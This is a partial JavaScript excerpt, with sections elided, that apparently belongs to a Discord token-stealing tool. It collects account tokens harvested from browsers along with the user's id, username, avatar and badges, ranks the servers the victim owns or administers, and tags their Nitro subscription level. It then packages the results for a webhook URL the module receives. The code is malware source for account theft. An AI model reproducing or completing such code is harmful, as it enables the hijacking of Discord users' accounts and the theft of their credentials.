...
const GetHQGuilds = async (guilds, token) => {
  ...
  let hQGuilds = await Promise.all(
    filteredGuilds.map(async (guild) => {
      try {
        ...
        const emoji = guild.owner ? `<:Owner:963333541343686696> Owner` : `<:Staff:1136740017822253176> Admin`;
...
const GetNitro = (flags) => {
  ...
  const monthsNitro = ['<:DiscordBoostNitro1:1297275185099182170> ', '<:DiscordBoostNitro2:1297275521868107886> ', '<:DiscordBoostNitro3:1297275188030738533> ', '<:DiscordBoostNitro6:1297275192724426915> ', '<:DiscordBoostNitro9:1297275523139112990> ', '<:DiscordBoostNitro12:1297275195400257597> ', '<:DiscordBoostNitro15:1297275198277423245> ', '<:DiscordBoostNitro18:1297275202442367067> ', '<:DiscordBoostNitro24:1297275207400161311> '];
...
module.exports = async (webhookUrl) => {
  ...
  for (const { browser, token } of tokens) {
    try {
      ...
      const tokenInfo = [`Token: ${token}`, `Browser: ${browser}`, `Id: ${user.id}`, `Username: ${user.username}`, `Avatar: ${avatar + '?size=512'}`, `Badges: ${user.public_flags}`];
